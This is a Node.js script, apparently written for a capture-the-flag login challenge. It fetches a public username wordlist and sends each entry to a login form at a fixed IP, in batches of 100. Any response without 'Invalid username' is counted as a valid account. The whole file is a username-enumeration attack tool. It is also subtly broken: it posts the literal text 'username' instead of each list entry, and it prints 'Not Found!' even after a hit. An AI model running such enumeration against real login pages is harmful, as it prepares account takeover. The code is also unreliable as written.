const axios = require('axios');
const qs = require('querystring');
const fs = require('fs');
const buildTask = (username, callback) => {
    return [callback(username)]
};
(async () => {
    let usernames = await axios.get('https://raw.githubusercontent.com/jeanphorn/wordlist/master/usernames.txt').then(response => response.data)
    usernames = usernames.split('\r\n')
    let temp = [];
    let counter = 0;
    for (const username of usernames) {
        counter++;
        console.log(`${counter}/${usernames.length}`);
        temp = temp.concat(buildTask(username, async (username) => {
            let result = await axios({
                url: 'http://35.227.24.107/92b3cf0c21/login',
                method: 'post',
                headers: {
                    'content-type': 'application/x-www-form-urlencoded'
                },
                data: qs.stringify({
                    username: 'username',
                    password: ''
                })
            }).then(response => response.data)
            if (result.includes('Invalid username') === false) {
                return {
                    found: true,
                    username,
                }
            }
            return {
                found: false,
                username,
            }
        }))
        if (counter % 100 === 0) {
            let results = await Promise.all(temp)
            results = results.filter(result => result.found)
            if (results.length !== 0) {
                console.log(results);
                break;
            }
            temp = []
        }
    }
    if (temp.length !== 0) {
        let results = await Promise.all(temp)
        results = results.filter(result => result.found)
        if (results.length !== 0) {
            console.log(results);
        }
    }
    console.log('Not Found!');
})();